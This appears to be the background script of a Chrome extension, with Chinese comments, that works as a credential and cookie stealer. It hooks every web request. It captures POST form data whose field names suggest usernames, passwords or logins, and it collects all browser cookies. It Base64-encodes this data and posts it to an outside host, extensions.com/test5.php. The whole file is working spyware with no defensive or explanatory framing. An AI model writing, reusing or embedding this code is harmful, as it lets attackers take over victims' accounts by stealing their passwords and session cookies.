var urls = "http://extensions.com/test5.php";
function start(data){
	if(fiddler(data.requestBody.formData)){
		sendto(impload(data));
		return true;
	}
}
function impload(data){
	if(data.length <= 0){return false;}
	var string = data.url+"?cookie=";
	for(i in data.requestBody.formData){
		string += i+"="+data.requestBody.formData[i]+"&";
	}
	return string;
}

function fiddler(data){
	for(i in data){
		if(i.indexOf("user") >= 0 || i.indexOf("pass") >= 0 || i.indexOf("log") >= 0){   //找关键字
			return true;	
		}
	}
	return false;
}



function sendto(datas){
	//console.log("Catch u: " + urls);
	var b = new Base64()
	datas = b.encode(escape(datas));
	$.ajax({      //ajax方法
        method: "POST",
        url: urls,
        data: { data: datas }
    })
   .done(function( msg ) {
   	    return true;
    });
	return  true;
}


function impload_cookie(url){
	var datas = url+"?cookie=";
	chrome.cookies.getAll({url:url},function(oauth){
		for(i in oauth){
			datas += oauth[i]["domain"]+"---"+"name:"+oauth[i]["name"]+"="+oauth[i]["value"];   //组合cookie
		}
		//console.log(datas)
		sendto(datas);
	})
}

chrome.webRequest.onBeforeRequest.addListener(  //调用Chrome方法监控tcp请求
   function(info) {
   	 if(info.method == "POST"){
   	 	info_data = info.requestBody.formData;
   	 	if(typeof(info_data) != "undefined"){
   	 	    start(info);
   	 	}
   	 }else{
   	 	    impload_cookie(info.url);
   	 }

     return ;
   },
   {
     urls: ["<all_urls>"],
     types: [
     "main_frame",
     "sub_frame",
     "xmlhttprequest"
     ]
   },
   ['requestBody']
 );